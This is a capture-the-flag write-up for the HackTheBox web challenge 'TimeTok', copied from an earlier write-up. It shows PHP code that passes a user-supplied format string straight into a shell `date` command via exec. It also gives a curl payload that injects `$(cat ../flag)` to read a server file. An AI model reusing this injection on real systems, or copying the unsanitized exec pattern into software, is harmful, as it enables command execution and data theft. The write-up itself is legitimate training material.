# TimeTok

### Overview
This challenge was a Web exploit challenge as a part of CyberHack 2023. This challenge was rated an easy challenge on Hackthebox.

### The Problem
Time is money. Money talks. ALWAYS stay up to date with the current time and date using our brand new service called TimeTok.

### Resources

https://twseptian.github.io/hackthebox/hackthebox%20business%20ctf%202021/ctf/htbbiz2021-time/

Major shoutout to Tri Wanda Septian, this writeup was a 1 for 1 copy of the web challenge TimeTok.
It is ironic, the greatest exploit for TimeTok wasn't the website, it was HTB re-using the challenge.

### Solution

When performing an nmap scan of the target (134.209.28.236:31321), we see that the target has 2 ports open, 80 and 31321. This nmap scan will provide little help for me, so I look towards the files the challenge was providing me with.

When looking at the file TimeController.php, I saw it was a 1 for 1 copy of the file Tri Wanda Septian provided in the resource above.

``````php
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
``````

Along with the file TimeModel.php, it was a 1 for 1 copy.
``````php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
``````

Now knowing that HTB re-used the same challenge on a differently formatted website (that in itself is a vulnerability) I followed Tri Wanda Septian instructions, where he used the following command (I changed the IP address to match my own):
``````bash
curl 'http://134.209.28.236:31321/?format=%H-%M-%S-%27;$(cat%20../flag)%27' | html2text | grep HTB{
``````

Lets analyze the three parts of Tri Wanda Septian command
- curl: allows the transfer of data to and from the specified URL
- html2text: this allows HTML to be converted into readable characters
- grep HTB{: this command grabs the string of characters that contain "HTB{" (aka it pulls the flag)

After utilizing this command, the flag is given to me.

### TL;DR
Utilizing an online resouce by Tri Wanda Septian showed that HTB gave us a way to exploit the time call in the php function, allowing us to pull the flag from the HTML.

### Flag
HTB{tim3_t4lks ... 4nd_1t_s4ys_1ts_t1m3_t0_pwn}
(This flag is similar to the flag that Tri Wanda Septian provided, but not exactly the same)
